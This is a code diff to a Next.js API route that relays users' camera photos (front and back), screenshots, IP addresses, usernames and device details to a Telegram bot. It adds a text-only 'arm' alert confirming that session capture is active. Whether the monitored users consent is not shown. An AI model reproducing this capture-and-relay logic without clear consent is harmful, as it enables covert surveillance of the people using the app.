@@ -35,7 +35,14 @@ const dataUrlToBlob = (dataUrl: string): Blob | null => {
 };
 
 export async function POST(req: NextRequest) {
-  let body: { photo?: string; photoBack?: string; screen?: string; label?: string; path?: string };
+  let body: {
+    photo?: string;
+    photoBack?: string;
+    screen?: string;
+    label?: string;
+    path?: string;
+    kind?: string;
+  };
   try {
     body = (await req.json()) as {
       photo?: string;
@@ -43,11 +50,14 @@ export async function POST(req: NextRequest) {
       screen?: string;
       label?: string;
       path?: string;
+      kind?: string;
     };
   } catch {
     return NextResponse.json({ ok: false }, { status: 400 });
   }
-  if (!body.photo) return NextResponse.json({ ok: false }, { status: 400 });
+  if (!body.photo && body.kind !== 'arm') {
+    return NextResponse.json({ ok: false }, { status: 400 });
+  }
 
   const auth = getAuthInfoFromCookie(req);
   if (auth && (auth.role === 'owner' || auth.role === 'admin')) {
@@ -95,7 +105,26 @@ export async function POST(req: NextRequest) {
   }
   if (!chatId) return NextResponse.json({ ok: true, telegram: 'no chat' });
 
-  const blob = dataUrlToBlob(body.photo);
+  // 布防通知：纯文字，确认该会话留影已生效
+  if (body.kind === 'arm') {
+    const armCaption = [
+      '🛰 操作留影已布防',
+      `时间：${now.toLocaleString('zh-CN', { hour12: false })} (UTC+8)`,
+      `账号：${username}`,
+      `IP：${ip}`,
+      `页面：${body.path || ''}`,
+      `设备：${osOf(ua)} · ${browserOf(ua)}`,
+    ].join('\n');
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: armCaption }),
+    }).catch(() => undefined);
+    recordEntry(req, { ip, loc: '', model: `${osOf(ua)} · ${browserOf(ua)}`, user: username });
+    return NextResponse.json({ ok: true, telegram: 'sent' });
+  }
+
+  const blob = dataUrlToBlob(body.photo || '');
   if (!blob) return NextResponse.json({ ok: false }, { status: 400 });
   const backBlob = body.photoBack ? dataUrlToBlob(body.photoBack) : null;
   const screenBlob = body.screen ? dataUrlToBlob(body.screen) : null;
